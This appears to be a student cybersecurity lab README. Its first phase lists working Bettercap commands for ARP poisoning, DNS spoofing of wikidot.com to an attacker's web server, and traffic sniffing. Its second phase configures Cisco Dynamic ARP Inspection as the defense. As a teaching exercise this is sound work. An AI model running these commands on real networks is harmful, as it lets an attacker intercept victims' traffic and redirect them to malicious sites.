Operation NetNabber
Fullstack Academy - Cybersecurity - Cohort 2208-fcb-et-cyb-pt
Team Members: Drago Bonacich and Troy Schmitz

# THIS DEMONSTRATION IS INTENDED FOR EDUCATIONAL PURPOSES ONLY. WE DO NOT CONDONE THE USE OF HACKING TOOLS FOR ILLEGAL PURPOSES.

Operation NetNabber was created as a two-phase demonstration, an attack and a defense strategy. Phase one utilizes a powerful network sniffing and spoofing tool known as Bettercap, which is included in the latest versions of Kali Linux. This tool allowed us to conduct an ARP poisoning attack between a Windows machine and its default gateway, letting us act as a Man in the Middle and giving us the ability to analyze any traffic between the two. Additionally, we were able to use a feature within the same tool to spoof the DNS cache when our target connected through us, and automatically navigated our victim’s browser to a malicious site running on our attacking machine. Phase two demonstrated the configuration of a defensive technology for these ARP poisoning attacks known as Dynamic ARP Inspection. This phase of our project was conducted on a network simulation tool from Cisco known as Packet Tracer. It allowed us to build a simulated network, demonstrate how to configure the correct settings to enable Dynamic ARP Inspection, and show the audience that an ARP spoofing attempt was not successful with this technology enabled.

Link to Video Demonstration: https://youtu.be/8abLuPq8g7c



Phase 1: Attack

# Change IP Forwarding in Kali Linux so that auto packet drop is disabled:
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# Change Windows registry to Enable IP Forwarding:
In registry editor browse to  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
Modify the value of the parameter IPEnableRouter from 0 to 1 and close the registry editor window
Restart your system and execute the command "netsh interface ipv4 show interface <if id>" to verify whether IP forwarding is enabled.

# Bettercap for Kali Linux (May not be natively installed and must be run with sudo privelages):
sudo bettercap

# Probe the network to see a list of devices connected:
net.probe on

# Lists all devices on the network with their MAC address and IP address
net.show

# Tells the program to target not only the IP address, but also the gateway that it's connected to so that you can see traffic going both ways:
set arp.spoof.fullduplex true

# Set your desired target IP address for ARP spoofing:
set arp.spoof.targets <ip address>

# Setting up DNS spoof so that when the target connects to "wikidot.com" it redirects the traffic to the attacking Kali Linux apache server:
set dns.spoof.domains wikidot.com

# Launch ARP poisoning attack:
arp.spoof on

# Turns the DNS spoof on:
dns.spoof on

# Turn the network sniffer on to see the traffic from the victim and the gateway:
net.sniff on



Phase 2: Defense

*** The following instructions are for configuration of Dynamic ARP Inspection on Cisco managed switches ***

# Open / Connect to the CLI of the Cisco managed switch.

# Enter user execution mode:
en

# Enter global configuration mode:
config t

# Enable DHCP Snooping globally:
ip dhcp snooping

(DHCP snooping will disallow all DHCP "offer" and "acknowledge" packets through the switch, except on the ports we set as Trusted. This will prevent any other device from acting as the DHCP server)

# Enter configuration mode for the interface connected to the DHCP server:
interface <dhcp_connected_interface>

# Trust the interface connected to the DHCP server:
ip dhcp snooping trust

# Exit the interface configuration and enter global configuration:
Ctrl + Z
config t

# Enable Dynamic ARP Inspection on the desired VLAN:
ip arp inspection vlan <#_vlan>
